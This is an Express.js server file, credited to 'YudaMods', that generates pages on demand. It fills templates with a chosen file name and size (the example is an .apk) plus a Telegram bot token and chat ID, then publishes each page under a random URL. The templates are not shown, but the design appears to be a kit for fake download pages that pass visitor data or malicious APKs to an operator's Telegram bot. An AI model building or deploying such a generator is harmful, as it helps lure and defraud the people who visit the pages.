const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const port = 8080;

// Helper: Generate random folder name
function generateRandomFolderName() {
    return crypto.randomBytes(5).toString('hex'); // Random 10-character string
}

// Helper: Generate dynamic HTML
function generateHtml(filename, size) {
    const templatePath = path.join(__dirname, 'public', 'templates', 'index.template.html');
    if (!fs.existsSync(templatePath)) {
        throw new Error('Template file for index.html is missing.');
    }
    const template = fs.readFileSync(templatePath, 'utf-8');
    return template
        .replace('{{filename}}', filename)
        .replace('{{size}}', size);
}

// Helper: Generate dynamic JS
function generateJs(botToken, chatId) {
    const templatePath = path.join(__dirname, 'public', 'templates', 'main.template.js');
    if (!fs.existsSync(templatePath)) {
        throw new Error('Template file for main.js is missing.');
    }
    const template = fs.readFileSync(templatePath, 'utf-8');
    return template
        .replace('{{botToken}}', botToken)
        .replace('{{chatId}}', chatId);
}

// Serve static files
app.use('/static', express.static(path.join(__dirname, 'public')));

// Endpoint to generate dynamic content
app.get('/', (req, res, next) => {
    try {
        const { filename, size, chatId, botToken } = req.query;

        // Validate required query parameters
        if (!filename || !size || !chatId || !botToken) {
            return res.status(400).json({ 
                error: "Missing required query parameters: filename, size, chatId, botToken.",
                example: `/filename=example.apk&size=25MB&chatId=123456&botToken=YOUR_BOT_TOKEN`
            });
        }

        // Validate filename format
        if (!/^[\w\-_. ]+$/.test(filename)) {
            return res.status(400).json({ error: 'Invalid filename format.' });
        }

        // Validate size format (e.g., 25MB, 1GB)
        if (!/^(\d+)(MB|GB|KB)$/i.test(size)) {
            return res.status(400).json({ error: 'Invalid size format. Use "25MB" or "1GB".' });
        }

        // Generate random folder
        const randomFolder = generateRandomFolderName();
        const outputPath = path.join(__dirname, 'public', randomFolder);

        if (!fs.existsSync(outputPath)) {
            fs.mkdirSync(outputPath, { recursive: true });
        }

        // Generate index.html and main.js
        const htmlContent = generateHtml(filename, size);
        const jsContent = generateJs(botToken, chatId);
        fs.writeFileSync(path.join(outputPath, 'index.html'), htmlContent);
        fs.writeFileSync(path.join(outputPath, 'main.js'), jsContent);

        // Send success response
        const resultUrl = `/static/${randomFolder}/index.html`;
        res.status(200).json({
            message: 'Page generated successfully.',
            resultUrl: resultUrl,
            creator: 'YudaMods',
        });
    } catch (err) {
        next(err);
    }
});

// Custom 404 Handler
app.use((req, res) => {
    const errorPage = path.join(__dirname, 'public', 'errors', '404.html');
    if (fs.existsSync(errorPage)) {
        res.status(404).sendFile(errorPage);
    } else {
        res.status(404).send('404 - Page Not Found');
    }
});

// Custom Error Handler
app.use((err, req, res, next) => {
    console.error('Server Error:', err.message);
    const errorPage = path.join(__dirname, 'public', 'errors', '500.html');
    if (fs.existsSync(errorPage)) {
        res.status(500).sendFile(errorPage);
    } else {
        res.status(500).send('500 - Internal Server Error');
    }
});

// Start server
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});
